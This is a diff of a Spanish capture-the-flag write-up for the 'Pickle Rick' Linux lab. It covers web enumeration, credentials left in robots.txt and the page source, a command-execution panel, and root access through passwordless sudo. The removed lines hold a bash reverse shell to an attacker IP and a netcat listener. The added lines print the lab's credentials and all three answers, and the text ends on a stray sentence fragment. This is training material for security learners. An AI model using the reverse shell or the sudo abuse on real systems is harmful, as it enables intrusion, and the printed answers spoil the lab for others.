@@ -1,4 +1,4 @@
-# Pickle Rick
+# Pickle Ricky
 
 ## 🖥️ Sistema
 
@@ -8,7 +8,7 @@ Linux
 
 ## 🎯 Objetivo del laboratorio
 
-Comprometer una máquina Linux obteniendo acceso a una consola web vulnerable, generar una **reverse shell**, realizar una enumeración del sistema y recuperar los tres ingredientes necesarios para que Rick complete su experimento.
+Comprometer una máquina Linux mediante la enumeración de una aplicación web, obtener acceso a un panel con **ejecución remota de comandos (RCE)** y recuperar los tres ingredientes necesarios aprovechando una configuración insegura de **sudo**.
 
 ---
 
@@ -16,25 +16,24 @@ Comprometer una máquina Linux obteniendo acceso a una consola web vulnerable, g
 
 - Gobuster
 - Burp Suite
-- Reverse Shell
-- Netcat
-- Bash
+- RCE
+- Linux Enumeration
 - Sudo
-- Web Command Execution
+- HTTP
 
 ---
 
 ## 🧠 Metodología
 
-La enumeración inicial mostró únicamente dos servicios expuestos: **SSH** y **HTTP**. Debido a que el acceso por SSH requería credenciales, toda la investigación se centró inicialmente en la aplicación web.
+La enumeración inicial mostró únicamente dos servicios: **SSH** y **HTTP**, por lo que el foco principal pasó a ser la aplicación web. Durante la exploración, la propia página sugería prestar atención a las pistas ocultas y utilizar herramientas como Burp Suite, lo que indicaba que gran parte de la información necesaria estaría expuesta en la aplicación.
 
-Durante la exploración encontré varias pistas repartidas entre el código fuente y distintos recursos accesibles mediante la web. En lugar de intentar realizar fuerza bruta desde el principio, decidí recopilar toda la información disponible antes de autenticarme. Esta estrategia permitió obtener tanto el nombre de usuario como la contraseña sin necesidad de realizar ataques adicionales.
+En lugar de intentar acceder directamente mediante fuerza bruta, decidí recopilar primero toda la información posible revisando el código fuente, los directorios ocultos y los archivos públicos. Esta estrategia permitió obtener tanto el usuario como la contraseña sin necesidad de realizar ataques adicionales.
 
-Tras acceder al panel de administración observé que existía una funcionalidad que permitía ejecutar comandos directamente sobre el servidor. En lugar de utilizarla únicamente para realizar tareas básicas, la aproveché para generar una **reverse shell** y obtener una sesión interactiva mucho más cómoda para continuar la auditoría.
+Una vez dentro del panel descubrí que disponía de una consola capaz de ejecutar comandos directamente sobre el servidor. Como ya existía una **RCE**, no fue necesario generar una reverse shell; toda la enumeración y la obtención de los ingredientes pudo realizarse desde el propio panel.
 
-Una vez dentro del sistema, la enumeración consistió principalmente en localizar archivos interesantes y revisar los privilegios disponibles. La máquina estaba diseñada para facilitar la escalada mediante una configuración insegura de **sudo**, por lo que fue posible obtener acceso como **root** sin necesidad de explotar vulnerabilidades adicionales.
+Finalmente, la revisión de los permisos mediante `sudo -l` reveló que el usuario podía ejecutar cualquier comando como **root** sin introducir contraseña, permitiendo recuperar el último ingrediente de forma inmediata.
 
-Este laboratorio pone de manifiesto cómo una aplicación web con información expuesta y una mala configuración de privilegios pueden comprometer completamente un sistema.
+Este laboratorio demuestra que una buena enumeración puede eliminar la necesidad de explotar vulnerabilidades complejas.
 
 ---
 
@@ -42,120 +41,165 @@ Este laboratorio pone de manifiesto cómo una aplicación web con información e
 
 ### 1. Enumeración inicial
 
-Comencé comprobando la conectividad con la máquina mediante `ping` y confirmé que se trataba de un sistema Linux gracias al TTL obtenido.
-
-Posteriormente realicé un escaneo completo utilizando Nmap.
+Comencé realizando un escaneo completo de puertos utilizando Nmap.
 
 ```bash
-nmap -p- --open -sS -sC -sV --min-rate 5000 -n -Pn 10.10.0.53
+nmap -p- 10.129.186.47
 ```
 
-Se identificaron los siguientes servicios:
+Los servicios identificados fueron:
 
 | Puerto | Servicio |
 |---------|----------|
 | 22 | SSH |
 | 80 | HTTP |
 
+Posteriormente profundicé en los servicios detectados.
+
+```bash
+nmap -sC -sV -p22,80 10.129.186.47
+```
+
+La enumeración confirmó que el objetivo era un sistema Linux con una aplicación web como principal superficie de ataque.
+
 ---
 
 ### 2. Enumeración web
 
-Al acceder a la página principal revisé el código fuente y encontré el siguiente usuario:
+Accedí a la página principal.
 
-```
-R1ckRul3s
+```text
+http://10.129.186.47
 ```
 
-A continuación realicé una enumeración de directorios mediante Gobuster.
+La propia aplicación sugería buscar ingredientes ocultos y utilizar herramientas como **Burp Suite** durante la investigación.
+
+Realicé una enumeración de directorios utilizando Gobuster.
 
 ```bash
-gobuster dir -u http://10.10.0.53 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+gobuster dir -u http://10.129.186.47 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
 ```
 
-Los recursos más interesantes fueron:
+Los recursos más interesantes encontrados fueron:
 
 - `/assets`
-- `/login.php`
 - `/robots.txt`
-
-Dentro de `robots.txt` encontré la siguiente cadena:
-
-```
-Wubbalubbadubdub
-```
-
-Tras probarla comprobé que correspondía a la contraseña del usuario descubierto anteriormente.
 
 ---
 
-### 3. Acceso al panel
+### 3. Descubrimiento de credenciales
 
-Con las credenciales obtenidas inicié sesión en:
+Al revisar el contenido de `robots.txt` encontré la siguiente cadena:
 
-```
-/login.php
-```
-
-El panel de administración incluía una funcionalidad para ejecutar comandos directamente sobre el servidor.
-
-En lugar de utilizarla únicamente para realizar pruebas, ejecuté una **reverse shell**.
-
-```bash
-bash -i >& /dev/tcp/10.23.88.247/4444 0>&1
+```text
+Wubbalubbadubdub
 ```
 
-En mi máquina atacante preparé un listener mediante Netcat.
+Esta información parecía corresponder a una contraseña.
 
-```bash
-nc -lvnp 4444
+Posteriormente revisé el código fuente de la página principal y encontré el usuario:
+
+```text
+R1ckRul3s
 ```
 
-La conexión se estableció correctamente y obtuve acceso al servidor.
+Durante la exploración del directorio `/assets` apareció un archivo llamado:
+
+```
+portal.jpg
+```
+
+Este recurso sugería la existencia de un panel de administración.
+
+Continuando con la enumeración localicé:
+
+```
+portal.php
+```
+
+y posteriormente:
+
+```
+login.php
+```
+
+Utilizando las credenciales descubiertas conseguí acceder al panel.
+
+```
+Usuario: R1ckRul3s
+
+Contraseña: Wubbalubbadubdub
+```
 
 ---
 
 ### 4. Acceso inicial
 
-Tras recibir la reverse shell realicé el tratamiento habitual de la TTY para trabajar con una consola completamente interactiva.
+Tras autenticarse correctamente apareció una consola capaz de ejecutar comandos directamente sobre el servidor.
+
+La ejecución de:
 
 ```bash
-script /dev/null -c bash
+whoami
 ```
 
-Posteriormente configuré correctamente el terminal.
-
-```bash
-stty raw -echo
-reset xterm
-export TERM=xterm
-export SHELL=bash
-```
-
-El usuario comprometido era:
+confirmó que la RCE se ejecutaba como:
 
 ```
 www-data
 ```
 
+Al disponer ya de ejecución remota de comandos no fue necesario generar una reverse shell, pudiendo continuar toda la enumeración desde el propio panel web.
+
 ---
 
-### 5. Enumeración interna
+### 5. Obtención de los ingredientes
 
-Durante la exploración del sistema encontré el primer ingrediente en el directorio actual.
+Durante la exploración localicé el primer ingrediente.
 
-Posteriormente revisé los usuarios existentes.
+El archivo correspondiente era:
 
-```bash
-cat /etc/passwd
+```
+Sup3rS3cretPickl3Ingred.txt
 ```
 
-Los directorios personales mostraban dos usuarios interesantes:
+Sin embargo, el comando `cat` estaba restringido.
 
-- ubuntu
-- rick
+Para evitar esta limitación utilicé:
 
-Dentro del directorio personal de **rick** encontré el segundo ingrediente necesario para completar el laboratorio.
+```bash
+tac Sup3rS3cretPickl3Ingred.txt
+```
+
+obteniendo:
+
+```
+mr. meeseek hair
+```
+
+Posteriormente revisé el directorio:
+
+```bash
+/home/rick
+```
+
+donde encontré el archivo:
+
+```
+second ingredients
+```
+
+Utilizando nuevamente `tac` recuperé el segundo ingrediente.
+
+```bash
+tac /home/rick/second\ ingredients
+```
+
+Resultado:
+
+```
+1 jerry tear
+```
 
 ---
 
@@ -167,25 +211,30 @@ Comprobé los permisos disponibles mediante:
 sudo -l
 ```
 
-El resultado indicaba que era posible ejecutar comandos como **root** sin necesidad de introducir contraseña.
+El resultado indicaba que el usuario **www-data** podía ejecutar cualquier comando como **root** sin necesidad de introducir contraseña.
 
-Gracias a esta configuración obtuve acceso al usuario **root** y accedí al directorio:
+Aproveché esta configuración para leer directamente el archivo que contenía el último ingrediente.
+
+```bash
+sudo tac /root/3rd.txt
+```
+
+Resultado:
 
 ```
-/root
+fleeb juice
 ```
-
-Allí recuperé el tercer y último ingrediente.
 
 ---
 
 ## 📚 Lecciones aprendidas
 
-- Este laboratorio permitió practicar una cadena de explotación sencilla basada principalmente en una correcta enumeración de la aplicación web y una mala configuración de privilegios.
-- Localizar información sensible revisando el código fuente de una página web.
-- Utilizar Gobuster para descubrir recursos ocultos.
-- Obtener credenciales revisando archivos públicos como `robots.txt`.
-- Aprovechar paneles con ejecución remota de comandos para obtener una reverse shell.
-- Estabilizar una shell interactiva en Linux.
-- Enumerar usuarios y directorios del sistema tras obtener acceso inicial.
-- Revisar configuraciones inseguras de `sudo` para conseguir privilegios elevados.
+- Este laboratorio permitió reforzar la importancia de la enumeración web y de interpretar correctamente las pistas distribuidas por toda la aplicación.
+- Revisar el código fuente en busca de credenciales.
+- Utilizar `robots.txt` como fuente de información sensible.
+- Descubrir paneles ocultos mediante enumeración de directorios.
+- Aprovechar una **RCE** integrada sin necesidad de obtener una reverse shell.
+- Adaptarse a las restricciones del entorno utilizando comandos alternativos como `tac`.
+- Revisar siempre los permisos mediante `sudo -l`.
+- Comprender el impacto de una configuración insegura de `sudo`.
+ proporcionar acceso completo al sistema de forma inmediata.
